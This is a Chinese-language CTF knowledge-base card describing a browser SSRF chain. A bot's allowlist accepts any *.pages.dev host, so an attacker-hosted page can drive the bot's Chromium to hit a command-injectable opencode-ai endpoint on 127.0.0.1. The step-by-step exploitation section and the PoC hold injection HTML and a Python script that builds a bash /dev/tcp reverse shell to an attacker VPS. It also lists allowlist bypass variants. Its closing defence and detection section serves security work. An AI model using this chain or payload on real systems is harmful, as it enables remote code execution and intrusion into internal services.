---
id: web-generic-ssrf-bot-pages-dev-allowlist-internal-service
title: Cloudflare Pages 白名单绕过 + 浏览器 SSRF：让 bot 以 pages.dev 页面打内网服务
type: scenario
domain: web
path: web/generic/ssrf
technique: bot-pages-dev-allowlist-browser-ssrf
tags:
- ssrf
- bot
- cloudflare-pages
- allowlist-bypass
- browser
- no-cors
- internal-service
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V125
  verified_at: '2026-11-06T04:11:16+08:00'
  notes: 已对照原文与 45 张截图核对：/report 仅校验 http/https 与 hostname.endsWith('.pages.dev')，no-cors 简单请求限制、opencode-ai@1.2.16 内网 /file/find GET 注入、/flag chmod 000 后 chmod 777 读取均与原文一致；未实际运行 PoC。
url: /docs/web/generic/ssrf/web-generic-ssrf-bot-pages-dev-allowlist-internal-service/
draft: false
kb_aliases:
- OpenShell
- pages.dev 白名单
- bot /report
- 浏览器 SSRF
- no-cors GET
- Playwright bot
---

## 一句话结论

bot 的 `/report` 只检查 URL 主机名以 `.pages.dev` 结尾，攻击者在 Cloudflare Pages 部署一个页面，bot 的 Chromium 访问该页面后，页面 JS 以 no-cors GET 请求 `http://127.0.0.1:4096/file/find?pattern=...`，即可让 bot 所在容器的内网服务执行命令并反弹 shell。

## 原理

- **白名单只做后缀匹配**：`/report` 用 `new URL(url)` 解析后检查 `protocol` 为 http/https、`hostname.endsWith('.pages.dev')`；没有解析 IP、没有禁止私有地址，也没有限制页面内发起的子请求。
- **攻击者控制 pages.dev 内容**：Cloudflare Pages 允许任意用户免费部署静态站点并获得 `*.pages.dev` 域名，因此攻击者可以完全控制 bot 访问的 HTML/JS。
- **浏览器在 bot 服务器上执行**：`visitUrl` 用 Playwright 启动 Chromium；页面里的 `fetch("http://127.0.0.1:4096/...")` 由 Chromium 发起，`127.0.0.1` 就是 bot 容器的 loopback，能访问只监听本机的内部服务。
- **no-cors 的限制**：跨源 `fetch` 默认受 CORS 限制，但 `mode: 'no-cors'` 的简单请求仍会发出（响应不可读，opaque）。简单请求只允许 GET/HEAD/POST，且 POST 的 `Content-Type` 只能是 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`；`application/json` 会直接抛 `TypeError`。因此要选 **GET** 型内网接口，而不是 POST JSON 接口。
- **内网服务与注入点**：容器内运行 `opencode-ai@1.2.16`，其 `/file/find` 是 GET 接口且存在命令注入（见关联卡）；页面用 `echo {base64}|base64 -d|bash` 组装命令，避免 URL 中的特殊字符被提前解析。
- **flag 权限**：`/flag` 是 `chmod 000`，但 bot 与 opencode 都以 `node` 用户运行；拿到 shell 后 `chmod 777 /flag && cat /flag` 即可读取。

## 触发条件

- 存在一个会访问用户提交 URL 的 bot（Playwright/Puppeteer/无头浏览器）。
- URL 白名单只按域名后缀/字符串匹配，允许攻击者控制的公共托管域名（如 `*.pages.dev`）。
- bot 容器内网有只监听 127.0.0.1 的服务，且该服务有 GET 型危险接口。
- 页面 JS 能以 no-cors 方式发出请求；目标接口不要求自定义头/JSON body。

## 利用步骤

1. 审计 bot 的 `/report`：记录允许的协议、域名后缀、是否解析 IP、是否限制重定向/子请求。
2. 在 Cloudflare Pages 创建项目，上传 `index.html`（或使用任意允许后缀的公共托管）。
3. 页面 JS 里对 `http://127.0.0.1:<port>/<GET 接口>?<参数>` 同时 `fetch` 和 `window.open`，提高触发成功率。
4. 在 VPS 起监听；把命令做 base64 后拼进 URL，例如 `echo <b64>|base64 -d|bash`，命令内容为反弹 shell。
5. 向 `/report` 提交 `https://<project>.pages.dev/index.html`；等待 bot 访问并触发内网请求。
6. 收到 shell 后读取 flag；若 `/flag` 权限为 000，先 `chmod 777 /flag`。

## PoC

`index.html`：

```html
<script>
const target = "http://127.0.0.1:4096/file/find?pattern=`echo BASE64_CMD|base64 -d|bash`";
window.open(target);
fetch(target, {mode: "no-cors"});
</script>
```

提交脚本：

```python
import base64
import requests

CHALLENGE = "target:8000"
PUBLIC_URL = "https://<project>.pages.dev/index.html"
VPS, PORT = "vps.example.com", 9999
cmd = f"/bin/bash -i >& /dev/tcp/{VPS}/{PORT} 0>&1"
b64 = base64.b64encode(cmd.encode()).decode()
# 把 b64 填进 index.html 的 BASE64_CMD 后重新部署
print(requests.post(f"http://{CHALLENGE}/report", json={"url": PUBLIC_URL}, timeout=10).text)
```

## 变体与关联

- **托管变体**：任何允许用户控制内容且匹配白名单后缀的公共托管（Pages、Workers、GitHub Pages、对象存储静态站点）都可替代。
- **请求变体**：no-cors GET、`<img src>`、`<script src>`、`window.open`、表单提交；POST 需用简单 Content-Type，且目标要能解析。
- **绕过变体**：若白名单解析 IP，可尝试 DNS rebinding、开放重定向、`@`/大小写/尾点等 URL 解析差异；若只允许 https，可用公共 HTTPS 托管。
- **关联卡片**：[[web-nodejs-opencode-ai-file-find-raw-shell-injection]]（内网 GET 注入点）、[[web-nodejs-opencode-ai-worktree-startcommand-bash-rce]]（POST JSON 注入点，no-cors 下不可用）、[[web-generic-ssrf-short-form-ip-302-post-to-get]]（SSRF 重定向/短写）、[[ctf-web-bot-jku-csp-crlf-cookie-hijack-chain]]（bot 访问链）。
- **边界**：若 bot 禁止子请求/外网、浏览器在无网络沙箱运行、或内网服务要求认证，则链不成立；no-cors 下读不到响应，必须靠 OOB/反弹确认。

## 检测与防御

- **白名单**：不要只做域名后缀匹配；解析目标 IP 并拒绝私有/回环/链路本地地址，限制重定向，限制页面子请求。
- **隔离**：bot 浏览器放在无内网访问的沙箱/独立网络；内网服务加认证并只监听需要的接口。
- **服务端**：内部服务不要暴露危险 GET 接口；命令执行接口做参数化/白名单。
- **检测信号**：bot 访问 pages.dev 后出现对 127.0.0.1/内网段的高频请求；页面含 `fetch`/`window.open` 指向内网；容器内异常 `bash -i`/`/dev/tcp` 连接。
